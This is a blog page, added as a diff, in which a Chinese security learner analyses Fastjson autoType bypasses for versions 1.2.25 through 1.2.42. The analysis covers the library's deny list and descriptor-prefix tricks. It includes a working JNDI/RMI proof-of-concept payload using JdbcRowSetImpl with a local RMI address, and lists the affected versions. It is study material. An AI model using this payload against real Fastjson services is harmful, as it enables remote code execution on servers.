@@ -1,0 +1,922 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Chiexf">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/10/07/java安全/fastjson反序列化(三)/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="0x00 介绍从1.2.24之后的版本，都有许多修复跟绕过，跟着网上的文章复现学习一下 0x01 历史版本绕过fastjson-1.2.25分析我们先来看一下1.2.25这个版本是怎么修复的 主要是引入了checkAutoType安全机制，会对要加载的类进行白名单和黑名单限制，并且引入了一个配置参数AutoTypeSupport 默认情况下autoTypeSupport关闭，导致不能直接反序列化任">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson反序列化(三)">
+<meta property="og:url" content="http://example.com/2023/10/07/Java%E5%AE%89%E5%85%A8/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%E4%B8%89)/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 介绍从1.2.24之后的版本，都有许多修复跟绕过，跟着网上的文章复现学习一下 0x01 历史版本绕过fastjson-1.2.25分析我们先来看一下1.2.25这个版本是怎么修复的 主要是引入了checkAutoType安全机制，会对要加载的类进行白名单和黑名单限制，并且引入了一个配置参数AutoTypeSupport 默认情况下autoTypeSupport关闭，导致不能直接反序列化任">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-10-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-10-19T13:05:31.915Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Fastjson">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/1.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/1.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/1.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Fastjson反序列化(三) -
+        
+        Chiexf&#39;blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Chiexf' Blog","subtitle":{"text":["好好学习，天天向上！！！","CTRL + CV player~"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/Chiexf","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.3.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"path":"/about","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":false}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"info","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+    
+
+    
+
+    <div class="main-content-container">
+        
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Chiexf&#39;blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        归档
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                        标签
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        分类
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/about"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        关于
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                归档
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/tags"  >
+                             
+                                
+                                标签
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                分类
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/about"  >
+                             
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                关于
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">Fastjson反序列化(三)</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/1.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Chiexf</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-10-07</span>
+        <span class="mobile">2023-10-07</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-10-19 21:05:31</span>
+            <span class="mobile">2023-10-19 21:05:31</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Fastjson/">Fastjson</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>从1.2.24之后的版本，都有许多修复跟绕过，跟着网上的文章复现学习一下</p>
+<h1 id="0x01-历史版本绕过"><a href="#0x01-历史版本绕过" class="headerlink" title="0x01 历史版本绕过"></a>0x01 历史版本绕过</h1><h2 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson-1.2.25"></a>fastjson-1.2.25</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们先来看一下<strong>1.2.25</strong>这个版本是怎么修复的</p>
+<p>主要是引入了<strong>checkAutoType</strong>安全机制，会对要加载的类进行白名单和黑名单限制，并且引入了一个配置参数<strong>AutoTypeSupport</strong></p>
+<p>默认情况下<strong>autoTypeSupport</strong>关闭，导致不能直接反序列化任意类</p>
+<p>在不开启<strong>autoTypeSupport</strong>的情况下，会先进行<strong>黑名单检测</strong>再进行<strong>白名单检测</strong></p>
+<p>如果在<strong>黑名单</strong>里，会直接抛出异常</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在开启<strong>autoTypeSupport</strong>的情况下，会先进行<strong>白名单检测</strong>再进行<strong>名单检测</strong></p>
+<p>如果在<strong>白名单</strong>里，会使用<strong>TypeUtils.loadClass</strong>加载</p>
+<p>然后在判断是否在<strong>黑名单</strong>里，在的会抛出异常</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>但是，还有一种情况，如果<strong>黑白名单</strong>里都不存在的话</p>
+<p>并且开启了<strong>autoTypeSupport</strong>或者<strong>expectClass</strong>不为空的话，也会调用<strong>TypeUtils.loadClass</strong>加载类</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>接着跟一下<strong>loadClass</strong> ，这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的**[<strong>、</strong>L<strong>、</strong>;** 字符</p>
+<p>那么加上<strong>L</strong>开头和**;**结尾实际上就可以绕过所有黑名单</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>白名单acceptList</strong></li>
+</ul>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AUTO_TYPE_ACCEPT_LIST --&gt; []</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>黑名单denyList</strong></li>
+</ul>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel,org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a><strong>POC</strong></h3><p><strong>JNDI</strong>+<strong>RMI</strong>为例</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class JdbcRowSetImpl &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,&quot; +</span><br><span class="line">                &quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:8085/CalcTest\&quot;,&quot; +</span><br><span class="line">                &quot;\&quot;autoCommit\&quot;:false&#125;&quot;;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>影响版本</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.2.25 &lt;= fastjson &lt;= 1.2.41</span><br></pre></td></tr></table></figure></div>
+
+<p>需开启<strong>autoTypeSupport</strong></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>@type</strong>添加<strong>L</strong>和**;**绕过</p>
+<h2 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson-1.2.42"></a>fastjson-1.2.42</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>在<strong>1.2.42</strong>版本中，<strong>fastjson</strong>依旧延续<strong>黑白名单</strong>的检测模式，不过将名单改成<strong>Hash</strong>值，防止绕过</p>
+<p>还是继续关注<strong>com.alibaba.fastjson.parser.ParserConfig</strong>这个类</p>
+<p>在<strong>checkAutoType</strong>中，首先会利用<strong>substring</strong>将<strong>L</strong>和**;**去掉</p>
+<p>不过只删除一次，所以其实可以对描述符双写绕过这个限制</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line">    <span class="keyword">if</span> ((((BASIC</span><br><span class="line">            ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">            * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>而且这个类中也给出了<strong>Hash</strong>算法<strong>fnv1a_64</strong>，在<strong>addDeny</strong>中调用，所以还是有机会撞出来的<strong>Hash</strong>值的</p>
+<p>网上也有<a class="link"   target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist" >黑白名单 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addDeny</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> TypeUtils.fnv1a_64(name);</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">fnv1a_64</span><span class="params">(String key)</span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">hashCode</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; key.length(); ++i)&#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> key.charAt(i);</span><br><span class="line">        hashCode ^= ch;</span><br><span class="line">        hashCode *= <span class="number">0x100000001b3L</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
